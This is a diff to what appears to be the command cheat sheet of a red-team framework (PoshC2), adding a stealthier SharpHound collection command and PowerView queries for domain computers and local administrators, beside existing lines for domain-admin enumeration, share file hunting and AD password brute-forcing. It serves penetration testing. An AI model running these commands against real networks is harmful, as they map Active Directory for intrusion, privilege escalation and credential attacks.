@@ -144,6 +144,7 @@ run-exe SharpSocksImplantTestApp.Program SharpSocks -url1 /Barbara-Anne/Julissa/
 Bloodhound:
 ===========
 sharphound --ZipFileName c:\\temp\\test.zip --JsonFolder c:\\temp\\
+sharphound --ZipFileName c:\\temp\\test.zip --JsonFolder c:\\temp\\ --RandomFilenames --CollectionMethod DcOnly --NoSaveCache --DomainController <DC1-NAME>
 
 Run Generic C# Executable:
 =============================
@@ -273,6 +274,7 @@ get-netgroupmember "domain admins" -recurse|select membername
 get-netcomputer | select-string -pattern "citrix"
 get-netcomputer -filter operatingsystem=*7*|select name
 get-netcomputer -filter operatingsystem=*2008*|select name
+get-netcomputer -searchbase "LDAP://OU=Windows 2008 Servers,OU=ALL Servers,DC=poshc2,DC=co,DC=uk"|select name
 get-domaincomputer -ldapfilter "(|(operatingsystem=*7*)(operatingsystem=*2008*))" -spn "wsman*" -properties dnshostname,serviceprincipalname,operatingsystem,distinguishedname | fl
 get-netgroup | select-string -pattern "internet"
 get-netuser -filter | select-object samaccountname,userprincipalname
@@ -308,6 +310,7 @@ get-netgroup | select-string -pattern "internet"
 invoke-hostscan -iprangecidr 172.16.0.0/24 (provides list of hosts with 445 open)
 get-netfileserver -domain testdomain.com
 find-interestingfile -path \\\\server\\share -officedocs -lastaccesstime (get-date).adddays(-7)
+get-netlocalgroupmember -computername host1 -groupname administrators| select membername
 brute-ad
 brute-locadmin -username administrator
 get-passpol
